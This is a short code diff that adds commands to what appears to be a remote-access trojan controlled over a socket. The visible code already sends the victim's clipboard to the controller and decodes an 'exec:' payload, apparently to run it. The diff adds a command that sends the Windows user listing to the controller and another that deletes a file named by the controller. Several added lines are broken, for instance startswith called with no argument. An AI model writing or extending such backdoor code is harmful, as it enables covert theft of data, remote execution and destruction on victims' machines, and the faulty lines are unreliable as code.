@@ -6,6 +6,7 @@ import subprocess
 import pyautogui
 import io
 import clipboard
+import os
 
 
 # TODO: conn keepalive
@@ -68,6 +69,12 @@ while True:
     elif msg == "clipboard":
         text = clipboard.paste()
         send_msg(sock, text.encode())
+    elif msg == "users":
+        users = next(os.walk("C:\Users"), (None, None, []))[2]
+        send_msg(sock, users.encode())
+    elif msg.startswith() == 'delete':
+        file_name = msg[msg.index(' '):]
+        os.remove(file_name)
     elif msg.startswith("exec:"):
         payload = msg[msg.index(':'):]
         payload_bytes = base64.b64decode(payload)
